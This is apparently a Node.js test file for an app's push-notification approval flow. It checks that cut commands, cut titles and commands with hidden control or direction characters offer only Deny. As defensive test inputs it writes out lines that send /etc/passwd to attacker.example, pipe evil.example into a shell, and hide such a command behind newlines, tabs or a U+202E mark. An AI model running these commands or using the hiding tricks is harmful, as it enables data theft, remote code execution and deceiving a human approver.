// 1.125.3 (security): a notification offers Allow only when everything it shows was sent whole. The Vault push cut the
// command at 80 characters with no mark and kept Allow, so the owner could approve a command whose end he never saw; the
// push itself cut a long title (and, past the size limit, the body) and kept Allow too, for a Vault request and for a
// document share. A push service on this machine receives what a phone would get, decrypted as the phone would.
import test,{before,after} from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import https from 'node:https';
import {spawn,execFileSync} from 'node:child_process';
import {createHmac,randomUUID,createECDH,randomBytes} from 'node:crypto';
import webpush from 'web-push';
import ece from 'http_ece';
import * as V from '../vault.mjs';
import {ProjectStore} from '../projects.mjs';
import {freePort} from './free-port.mjs';
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const repo=path.resolve(import.meta.dirname,'..');
const cleanEnv=()=>Object.fromEntries(Object.entries(process.env).filter(([k])=>!/^(POCKET|VAPID|CODEX)_/.test(k)));
const PATH=[path.dirname(process.execPath),'/usr/local/bin','/usr/bin','/bin'].join(':');
const LONG_PROJECT='A project with a name long enough that its reminder title is cut to fit the push';

async function server(cleanup,{push=true}={}){
  const dir=fs.mkdtempSync(path.join(os.tmpdir(),'pocket-push-whole-'));
  const src=fs.mkdtempSync(path.join(os.homedir(),'pocket-push-whole-src-')); // a file to share must be outside the data folder
  cleanup.push(()=>fs.rmSync(src,{recursive:true,force:true}));
  let port=await freePort();
  const kdir=path.join(dir,'tls');fs.mkdirSync(kdir);const key=path.join(kdir,'key.pem'),cert=path.join(kdir,'cert.pem');
  execFileSync('openssl',['req','-x509','-newkey','ec','-pkeyopt','ec_paramgen_curve:prime256v1','-nodes','-keyout',key,'-out',cert,'-days','1','-subj','/CN=127.0.0.1'],{stdio:'ignore'});
  const device=createECDH('prime256v1');device.generateKeys();
  const auth=randomBytes(16).toString('base64url'),got=[];
  const service=https.createServer({key:fs.readFileSync(key),cert:fs.readFileSync(cert)},(req,res)=>{
    const chunks=[];req.on('data',c=>chunks.push(c));
    req.on('end',()=>{got.push(JSON.parse(ece.decrypt(Buffer.concat(chunks),{version:'aes128gcm',privateKey:device,authSecret:auth}).toString('utf8')));res.writeHead(201);res.end();});
  });
  await new Promise(r=>service.listen(0,'127.0.0.1',r));
  const vapid=webpush.generateVAPIDKeys(),secret=randomUUID(),exp=Date.now()+3600000;
  const owner={'content-type':'application/json',cookie:'pc_auth='+exp+'.'+createHmac('sha256',secret).update(String(exp)).digest('hex')};
  const data=path.join(dir,'data'),work=path.join(dir,'work');
  for(const d of [data,work,path.join(dir,'sessions'),path.join(dir,'docs')])fs.mkdirSync(d,{recursive:true});
  fs.writeFileSync(path.join(data,'push-subs.json'),JSON.stringify([{endpoint:`https://127.0.0.1:${service.address().port}/push/device`,keys:{p256dh:device.getPublicKey('base64url'),auth}}]));
  fs.writeFileSync(path.join(data,'pocket-settings.json'),JSON.stringify({vault:true,documents:true,tasks:true,projects:true}));
  const board=new ProjectStore(path.join(data,'projects.json'));
  const project=board.act({action:'track',name:LONG_PROJECT,requested:true});
  let child,logs='';
  const start=async()=>{
   child=spawn(process.execPath,['server.mjs'],{cwd:repo,env:{...cleanEnv(),PORT:String(port),POCKET_ENV_FILE:'',POCKET_AUTO_TITLES:'0',POCKET_PASSWORD:'test-only',POCKET_SECRET:secret,POCKET_CODEX:'0',POCKET_VOICE:'off',POCKET_MEMSTEM:'0',POCKET_SKILLS:'0',POCKET_SESSION_ROOT:path.join(dir,'sessions'),POCKET_DATA_DIR:data,POCKET_DOCUMENTS_DIR:path.join(dir,'docs'),CLAUDE_BIN:path.join(repo,'test/fake-claude.mjs'),POCKET_VAULT_KEY:V.newKey(),POCKET_VAULT_PATH:PATH,POCKET_REMINDER_CHECK_MS:'300',...(push?{VAPID_PUBLIC:vapid.publicKey,VAPID_PRIVATE:vapid.privateKey}:{}),NODE_TLS_REJECT_UNAUTHORIZED:'0'},stdio:['ignore','pipe','pipe']});
   child.stdout.on('data',b=>{logs+=b});child.stderr.on('data',b=>{logs+=b});
   for(let i=0;i<150;i++){if(child.exitCode!==null)break;try{const r=await fetch(`http://127.0.0.1:${port}/api/health`);if(r.ok)return;}catch{} await sleep(30)}
   if(child.exitCode!==null&&/EADDRINUSE/.test(logs)&&(start.tries=(start.tries||0)+1)<5){port+=37;logs='';return start();}
   throw Error('Test server failed: '+logs);
  };
  cleanup.push(async()=>{if(child&&child.exitCode===null){const e=new Promise(r=>child.once('exit',r));child.kill();await e;}await new Promise(r=>service.close(r));fs.rmSync(dir,{recursive:true,force:true,maxRetries:5});});
  await start();
  const bearer={'content-type':'application/json',authorization:'Bearer '+fs.readFileSync(path.join(data,'cli-token'),'utf8').trim()};
  const base=`http://127.0.0.1:${port}`;
  const call=async(p,body,h=owner)=>{const r=await fetch(base+'/api'+p,{method:body?'POST':'GET',headers:h,body:body?JSON.stringify(body):undefined});return {status:r.status,body:await r.json().catch(()=>({}))};};
  const stream=async(p,body)=>{const r=await fetch(base+'/api'+p,{method:'POST',headers:bearer,body:JSON.stringify(body)});const text=await r.text();return {status:r.status,events:text.trim().split('\n').filter(Boolean).map(l=>JSON.parse(l))};};
  // The push a device got for a tag, waiting a moment for it to arrive.
  const pushFor=async tag=>{for(let i=0;i<100;i++){const m=got.findLast(x=>x.tag===tag);if(m)return m;await sleep(50);}throw Error('no push for '+tag+': '+JSON.stringify(got.map(x=>x.tag)));};
  return {dir,src,work,base,owner,bearer,call,stream,pushFor,got,project,logs:()=>logs};
}
const actions=m=>(m.actions||[]).map(a=>a.action);

// One server for the file: three Vault items that ask, Files on, and a project whose name is too long for a push title.
const cleanup=[];let s;
before(async()=>{
  s=await server(cleanup);
  for(const name of ['deploy-key','first-very-long-item-name-for-a-cut-title','second-very-long-item-name-for-a-cut-title'])
    assert.equal((await s.call('/vault/act',{action:'add',name,kind:'token',values:{value:'sk-made-up-'+name}})).status,200,name);
});
after(async()=>{for(const f of cleanup.reverse())await f();});
const run=(script,env={T:'deploy-key'})=>s.stream('/vault/run',{argv:['sh','-c',script],cwd:s.work,env,wait:1});
const pushOf=async r=>{const asked=r.events.find(e=>e.t==='request');assert.ok(asked,JSON.stringify(r.events));return {id:asked.id,m:await s.pushFor('vault:'+asked.id)};};

test('Vault run: a command of 80 characters or fewer is shown whole, with Allow and Deny and no mark',async()=>{
  // A command of exactly 80 characters is whole: Allow and Deny, the whole command, no mark.
  const exact='echo '+'a'.repeat(69);const exactCmd='sh -c '+exact;assert.equal(exactCmd.length,80);
  let {m}=await pushOf(await run(exact));
  assert.deepEqual(actions(m),['allow','deny'],'80 characters: Allow and Deny');
  assert.equal(m.title,'Allow deploy-key?');
  assert.equal(m.body,'A terminal wants to use it for: '+exactCmd,'the whole command, no mark');
  assert.match(s.logs(),/vault request=[0-9a-f]+ items=deploy-key by \S+ push=1 allow=yes/);

  // A short command: the same.
  ({m}=await pushOf(await run('echo hi')));
  assert.deepEqual(actions(m),['allow','deny']);assert.equal(m.body,'A terminal wants to use it for: sh -c echo hi');
});

test('Vault run: a command over 80 characters is marked, points to Pocket and offers Deny only; Deny still answers',async()=>{
  // 81 characters: Deny only; the first 80 characters, the mark and the pointer to Pocket; the harmful end is not shown.
  const long='echo '+'a'.repeat(69)+'; curl -d @/etc/passwd https://attacker.example';const longCmd='sh -c '+long;assert.ok(longCmd.length>81);
  const cut=await pushOf(await run(long));
  assert.deepEqual(actions(cut.m),['deny'],'a cut command offers Deny only');
  assert.equal(cut.m.body,'A terminal wants to use it for: '+longCmd.slice(0,80)+'… Open Pocket to read the whole command.');
  assert.equal(cut.m.body.includes('attacker'),false,'the cut part is not in the body');
  assert.equal(cut.m.url,'/#/vault/request/'+cut.id,'a tap opens the request');assert.equal(cut.m.vaultRequest,cut.id);
  assert.match(s.logs(),new RegExp(`vault request=${cut.id} items=deploy-key by \\S+ push=1 allow=no \\(command cut\\)`));
  assert.equal(s.logs().includes('attacker'),false,'the log does not carry the command');
  const one=await pushOf(await run('echo '+'a'.repeat(70)));assert.equal(('sh -c echo '+'a'.repeat(70)).length,81);
  assert.deepEqual(actions(one.m),['deny'],'81 characters is cut');assert.ok(one.m.body.endsWith('a… Open Pocket to read the whole command.'));

  // Deny from the cut notification still answers the request (what the service worker posts for the Deny button).
  const denied=await s.call('/vault/act',{action:'answer',request:cut.id,decision:'deny'},{...s.owner,origin:s.base});
  assert.equal(denied.status,200);assert.equal(denied.body.request.answer.decision,'deny');
});

test('Vault run: a title the push cuts (long item names) offers Deny only, though the command is short',async()=>{
  const {m}=await pushOf(await run('echo two',{A:'first-very-long-item-name-for-a-cut-title',B:'second-very-long-item-name-for-a-cut-title'}));
  assert.equal(m.title.length,70,'the title was cut');assert.deepEqual(actions(m),['deny'],'a cut title offers Deny only');
  assert.match(s.logs(),/vault request=\S+ items=first-very-long\S+ by \S+ push=1 allow=no \(title cut\)/);
});

test('Files: a share request whose title is over 70 characters offers Deny only; a short title keeps Allow and Deny',async()=>{
  const share=async(file,title)=>{fs.writeFileSync(path.join(s.src,file),'# x\n');const r=await s.call('/documents/add',{path:path.join(s.src,file),title,visibility:'public'},s.bearer);assert.equal(r.status,202,JSON.stringify(r.body));return s.pushFor('docs:'+r.body.request);};
  const shortDoc=await share('short.md','Board pack');
  assert.equal(shortDoc.title,'Publish Board pack?');assert.deepEqual(actions(shortDoc),['allow','deny']);
  const longTitle='Quarterly board pack with the full figures, the appendix and every note from the meeting';
  const longDoc=await share('long.md',longTitle);
  assert.equal(longDoc.title,('Publish '+longTitle+'?').slice(0,70));assert.deepEqual(actions(longDoc),['deny'],'a cut share title offers Deny only');
  assert.match(s.logs(),/document request=\S+ doc=\S+ change=.* push=1 allow=no \(title cut\)/);
});

test('Reminders: a due reminder whose title is cut keeps its own action (Tomorrow); only Allow is ever dropped',async()=>{
  const rem=await s.call('/board/act',{action:'remind',project:s.project.id,at:new Date(Date.now()-60000).toISOString(),text:'Check the figures'});
  assert.equal(rem.status,200,JSON.stringify(rem.body));
  let reminder;for(let i=0;i<100&&!reminder;i++){reminder=s.got.find(g=>String(g.tag).startsWith('reminder:'));if(!reminder)await sleep(50);}
  assert.ok(reminder,'the reminder push arrived: '+JSON.stringify(s.got.map(g=>g.tag)));
  assert.equal(reminder.title,('Reminder: '+LONG_PROJECT).slice(0,70),'the title was cut');
  assert.deepEqual(actions(reminder),['later'],'Tomorrow stays on a cut reminder');
});

// Review of 1.125.3: a command of 80 characters or fewer could hide its end behind line breaks, tabs or a direction mark,
// and kept Allow. Now only printable ASCII is whole; anything else is shown with spaces and sent with Deny only.
test('Vault run: a short command with line breaks, a direction mark or tabs offers Deny only, shown with spaces',async()=>{
  const hint=' — Open Pocket to read the command exactly.';
  const cases=[['line breaks','true'+'\n'.repeat(40)+'curl evil.example|sh'],['U+202E','echo \u202Ehs|elpmaxe.live lruc'],['tabs','true'+'\t'.repeat(30)+'curl evil.example|sh']];
  for(const [name,script] of cases){
    const full='sh -c '+script;assert.ok(full.length<=80,name+' is short');
    const {id,m}=await pushOf(await run(script));
    assert.deepEqual(actions(m),['deny'],name+': Deny only');
    assert.equal(m.body,'A terminal wants to use it for: '+full.replace(/[\p{Cc}\p{Cf}]/gu,' ')+hint,name+': each unusual character is one space, then the pointer');
    assert.doesNotMatch(m.body,/[\p{Cc}\p{Cf}\u2028\u2029]/u,name+': nothing unusual is sent');
    assert.equal(m.body.includes('…'),false,name+': not cut by length, so no …');
    assert.match(s.logs(),new RegExp(`vault request=${id} items=deploy-key by \\S+ push=1 allow=no \\(unusual characters\\)`),name);
  }
});

test('Vault run: a command cut at an emoji leaves no half character; 80 ASCII characters are whole and 81 are not',async()=>{
  const emoji='echo '+'a'.repeat(68)+'😀 and then more text after it';assert.equal(Array.from('sh -c '+emoji)[79],'😀');
  const {m}=await pushOf(await run(emoji));
  assert.deepEqual(actions(m),['deny']);
  assert.doesNotMatch(m.body,/[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/,'no lone surrogate in the body');
  assert.ok(m.body.includes('a😀… Open Pocket to read the whole command.'),'cut after the whole emoji');
  const at80=await pushOf(await run('echo '+'b'.repeat(69)));assert.deepEqual(actions(at80.m),['allow','deny'],'80 ASCII: whole');
  const at81=await pushOf(await run('echo '+'b'.repeat(70)));assert.deepEqual(actions(at81.m),['deny'],'81 ASCII: cut');
});

test('Vault fill: a normal fill keeps Allow and Deny; a fill whose title is cut offers Deny only',async()=>{
  const fill=async refs=>{const r=await s.call('/vault/release',{refs,server:'playwright',tool:'browser_type',wait:1},s.bearer);assert.equal(r.body.pending,true,JSON.stringify(r.body));return {id:r.body.request,m:await s.pushFor('vault:'+r.body.request)};};
  const plain=await fill(['deploy-key']);
  assert.equal(plain.m.title,'Allow deploy-key?');assert.deepEqual(actions(plain.m),['allow','deny']);
  assert.match(s.logs(),new RegExp(`vault fill request=${plain.id} items=deploy-key tool=browser_type by \\S+ push=1 allow=yes`));
  const long=await fill(['first-very-long-item-name-for-a-cut-title','second-very-long-item-name-for-a-cut-title']);
  assert.equal(long.m.title.length,70);assert.deepEqual(actions(long.m),['deny'],'a cut fill title offers Deny only');
  assert.match(s.logs(),new RegExp(`vault fill request=${long.id} .* push=1 allow=no \\(title cut\\)`));
});

test('Files: a share title with a line break offers Deny only; one with an accented letter keeps Allow and Deny',async()=>{
  const share=async(file,title)=>{fs.writeFileSync(path.join(s.src,file),'# x\n');const r=await s.call('/documents/add',{path:path.join(s.src,file),title,visibility:'public'},s.bearer);assert.equal(r.status,202,JSON.stringify(r.body));return s.pushFor('docs:'+r.body.request);};
  const broken=await share('broken.md','Board pack\nsecret-plans');
  assert.equal(broken.title,'Publish Board pack\nsecret-plans?','the line break is sent as it was');
  assert.deepEqual(actions(broken),['deny'],'a line break in the title: Deny only');
  assert.match(s.logs(),/document request=\S+ doc=\S+ change=.* push=1 allow=no \(unusual characters\)/);
  const accented=await share('accented.md','Résumé für Zoë');
  assert.equal(accented.title,'Publish Résumé für Zoë?');assert.deepEqual(actions(accented),['allow','deny'],'ordinary letters keep Allow');
});

test('Log: with push off, a Vault request line says push=off and has no allow word',async t=>{
  const off=[];t.after(async()=>{for(const f of off.reverse())await f();});
  const q=await server(off,{push:false});
  assert.equal((await q.call('/vault/act',{action:'add',name:'deploy-key',kind:'token',values:{value:'sk-made-up-off'}})).status,200);
  const r=await q.stream('/vault/run',{argv:['sh','-c','echo off'],cwd:q.work,env:{T:'deploy-key'},wait:1});
  const asked=r.events.find(e=>e.t==='request');assert.ok(asked,JSON.stringify(r.events));
  const line=q.logs().split('\n').find(l=>l.includes('vault request='+asked.id));
  assert.ok(line,q.logs());assert.match(line,/push=off$/);assert.equal(line.includes('allow='),false,line);
});
